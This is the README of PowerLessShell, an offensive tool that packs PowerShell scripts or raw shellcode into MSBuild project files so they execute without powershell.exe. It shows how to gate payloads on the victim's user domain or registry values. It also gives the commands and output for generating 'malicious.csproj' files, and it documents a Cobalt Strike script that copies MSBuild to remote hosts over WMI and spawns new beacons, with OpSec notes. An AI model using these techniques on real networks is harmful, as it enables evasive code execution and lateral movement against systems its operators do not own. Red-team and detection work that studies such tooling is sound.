# PowerLessShell

PowerLessShell rely on MSBuild.exe to remotely execute PowerShell scripts and commands without spawning powershell.exe. 
You can also execute raw shellcode using the same approach.

# MSBuild conditions 

MSBuild support condition that can be used to avoid running code if the condition is not met.

```
<Target Name="x" Condition="'$(USERDOMAIN)'=='RingZer0'">
```

The malicious code will only be executed if the current user domain is "RingZer0"

Condition supports several other formats that can be used to create more conditional execution check.

```
<Target Name="x" Condition="'$(registry:HKEY_LOCAL_MACHINE\blah@blah)'>='0'">
```

Property Functions also expose interesting data.

```
https://docs.microsoft.com/en-us/visualstudio/msbuild/property-functions
```

# Usage

PowerLessShell use commandline argument to generate the final file.

```
$ python PowerLessShell.py -h
PowerLessShell Less is More
Mr.Un1k0d3r RingZer0 Team
-----------------------------------------------------------
usage: PowerLessShell.py [-h] [-type TYPE] -source SOURCE -output OUTPUT
                         [-arch ARCH] [-condition CONDITION]

optional arguments:
  -h, --help            show this help message and exit
  -type TYPE            Payload type (shellcode/powershell) default to:
                        shellcode
  -source SOURCE        Path to the source file (raw shellcode or powershell
                        script)
  -output OUTPUT        MSBuild output filename
  -arch ARCH            Shellcode architecture (32/64) default to: 32
  -condition CONDITION  XML Compiling condition default (Check for USERDOMAIN)
                        default is: none
```

Generating a powershell payload
```
$ python PowerLessShell.py -type powershell -source script.ps1 -output malicious.csproj
PowerLessShell Less is More
Mr.Un1k0d3r RingZer0 Team
-----------------------------------------------------------
Generating the msbuild file using include/template-powershell.csproj as the template
File 'malicious.csproj' created
Process completed
```

Generating a shellcode payload
```
$ python PowerLessShell.py -source shellcode.raw -output malicious.csproj
PowerLessShell Less is More
Mr.Un1k0d3r RingZer0 Team
-----------------------------------------------------------
Generating the msbuild file using include/template-shellcode.csproj as the template
File 'malicious.csproj' created
Process completed
```

Generating a 64 bits shellcode payload
```
$ python PowerLessShell.py -source shellcode64.raw -output malicious.csproj -arch 64
PowerLessShell Less is More
Mr.Un1k0d3r RingZer0 Team
-----------------------------------------------------------
Generating the msbuild file using include/template-shellcode.csproj as the template
Generating a payload for a 64 bits shellcode! Don't forget to use the 64 bits version of msbuild.exe
File 'malicious.csproj' created
Process completed
```

# Cobalt Strike Aggressor script (wmi_msbuild.cna) 
By Alyssa (ramen0x3f) and MrT-F
### Set Up
* Either copy PowerLessShell folder to [cobalts working dir]/PowerLessShell or make note of path
* If you didn't copy it to the Cobalt directory: edit the $pls_path variable in this file to point to PowerLessShell
* Load script into Cobalt Strike

### Usage
```
check_msbuild -target TARGET   		Verify .NET 4.0.30319 is installed (should see "Status OK")
	[-user user] [-pass pass]		Windows 7 has .NET 4.0.30319 after 3 reboots and 4 Windows update cycles

rename_msbuild -target TARGET 		Copy MSBuild.exe. 
	-msbuild newname 
 	[-path C:\new\path] 		Default - C:\Users\Public\
	[-user domain\username]		Specifying user/pass spawns cmd on remote host.
 	[-pass password]			

wmi_msbuild -target TARGET 		 	Spawn new beacon. 
         -listener LISTENER
	[-payload new_file]		 	Default - [a-zA-Z].tmp
	[-directory new_dir]			Default - C:\Users\Public\
	[-msbuild alt_msbuild_location] 	
	[-user USERNAME] [-pass PASSWORD]	
	[-manualdelete]				Switch doesn't auto delete payload.
```
### OpSec Notes
Spawns cmd.exe on the target system if
* ManualDelete switch is not set
* rename_msbuild is run with a username/password specified

# Credit
Mr.Un1k0d3r RingZer0 Team 2017

